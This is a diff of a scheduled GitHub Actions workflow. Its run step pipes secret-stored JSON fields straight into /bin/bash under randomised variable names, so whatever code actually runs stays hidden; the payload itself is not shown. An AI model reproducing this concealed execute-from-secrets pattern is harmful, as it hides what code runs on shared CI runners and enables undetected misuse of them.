@@ -3,27 +3,29 @@ name: huangxuexiao1960
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '8 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huangxuexiao1960
         env:
-          vd515: ${{ secrets.vd515 }}
+          zdh995: ${{ secrets.zdh995 }}
         run: |
-          echo $vd515 | jq -r .vcr12 | /bin/bash
-          echo $uwhty33 | jq -r .ocyr94425 | /bin/bash
-          echo $twv39 | jq -r .imxos643 | /bin/bash
-          echo $xeet134 | jq -r .ui71368 | /bin/bash
-          echo $hcat1 | jq -r .jnzw1407 | /bin/bash
-          echo $miwtp2041 | jq -r .kas0 | /bin/bash
-          echo $j42 | jq -r .pbt242 | /bin/bash
-          echo $jkb9202 | jq -r .tuog644 | /bin/bash
-          echo $rjmkg50 | jq -r .md64781 | /bin/bash
-          echo $sm8315 | jq -r .zw265 | /bin/bash
-          echo $owre4279 | jq -r .jvx4 | /bin/bash
-          echo $xxobq5014 | jq -r .zywn024 | /bin/bash
+          echo $zdh995 | jq -r .b007 | /bin/bash
+          echo $zyy8980 | jq -r .izwl62 | /bin/bash
+          echo $bpc5764 | jq -r .t0 | /bin/bash
+          echo $xxxsy01474 | jq -r .lkmw76425 | /bin/bash
+          echo $kq57 | jq -r .k592 | /bin/bash
+          echo $xfgw442 | jq -r .u7171 | /bin/bash
+          echo $d49 | jq -r .we4 | /bin/bash
+          echo $ss356 | jq -r .bjgqd5 | /bin/bash
+          echo $sd68870 | jq -r .aw13 | /bin/bash
+          echo $dlulv664 | jq -r .xec5638 | /bin/bash
+          echo $z75455 | jq -r .raqk2628 | /bin/bash
+          echo $cjsr414 | jq -r .pr84 | /bin/bash
+          echo $no236 | jq -r .golsz08117 | /bin/bash
+          echo $kdsa8 | jq -r .jsyi7 | /bin/bash
 
